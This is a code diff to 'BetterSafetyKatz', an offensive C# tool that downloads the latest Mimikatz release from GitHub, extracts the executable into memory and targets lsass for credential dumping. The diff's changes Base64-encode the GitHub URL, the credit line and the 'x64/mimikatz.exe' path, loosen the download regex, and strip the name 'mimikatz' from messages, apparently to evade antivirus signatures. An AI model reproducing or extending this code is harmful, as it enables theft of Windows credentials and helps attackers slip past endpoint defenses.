@@ -28,7 +28,7 @@ namespace BetterSafetyKatz
 
         static void Main(string[] args)
         {
-            Console.WriteLine("[+] Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9");
+            Console.WriteLine("[+] " + Encoding.UTF8.GetString(Convert.FromBase64String("U3RvbGVuIGZyb20gQGhhcm1qMHksIEBzdWJ0ZWUgYW5kIEBnZW50aWxraXdpLCByZXB1cnBvc2VkIGJ5IEBGbGFuZ3ZpayBhbmQgQE1ydG45")));
             if (!IsHighIntegrity())
             {
                 Console.WriteLine("[X] Not in high integrity, unable to grab a handle to lsass!");
@@ -46,7 +46,7 @@ namespace BetterSafetyKatz
 
                 if (!(IntPtr.Size == 8))
                 {
-                    Console.WriteLine("[X] Process is not 64-bit, this version of Mimikatz won't work yo'!");
+                    Console.WriteLine("[X] Process is not 64-bit, this version of katz won't work yo'!");
                     return;
                 }
 
@@ -56,24 +56,25 @@ namespace BetterSafetyKatz
                 //headers needed for the github API to answer back
                 webClient.Headers.Set("User-Agent", "request");
 
+                //https://api.github.com/repos/BADWORD/BADWORD/releases/latest
                 //Ask the API for the latest releases, should prob be async but lazy
-                string latestReleases = webClient.DownloadString("https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest");
+                string latestReleases = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9nZW50aWxraXdpL21pbWlrYXR6L3JlbGVhc2VzL2xhdGVzdA==")));
 
                 //Regex out the latest url for the zip build of katz
-                Regex urlRegex = new Regex(@"https:\/\/github.com\/gentilkiwi\/mimikatz\/releases\/download\/([0-9\.-]*)\/mimikatz_trunk\.zip", RegexOptions.IgnoreCase);
+                Regex urlRegex = new Regex(@"https:\/\/github.com\/([a-z\.-]*)\/([a-z\.-]*)\/releases\/download\/([0-9\.-]*)\/([a-z\.-]*)_trunk\.zip", RegexOptions.IgnoreCase);
 
                 //Pull the latest release as a ZIP file
                 string latestUrl = urlRegex.Matches(latestReleases)[0].ToString();
 
 
-                Console.WriteLine("[+] Contacting gentilkiwi -> " + latestUrl.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
+                Console.WriteLine("[+] Contacting repo -> " + latestUrl.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
 
                 //Download that
                 byte[] zipStream = webClient.DownloadData(latestUrl);
 
                 MemoryStream catStream = new MemoryStream();
 
-                // unzip.Extract(@"x64/mimikatz.exe", catStream);
+                // unzip.Extract(@"x64/BADWORD.exe", catStream);
                 (new Unzip(new MemoryStream(zipStream))).Extract(Encoding.UTF8.GetString(Convert.FromBase64String("eDY0L21pbWlrYXR6LmV4ZQ==")), catStream);
 
                 Console.WriteLine("[+] Randomizing strings in memory");
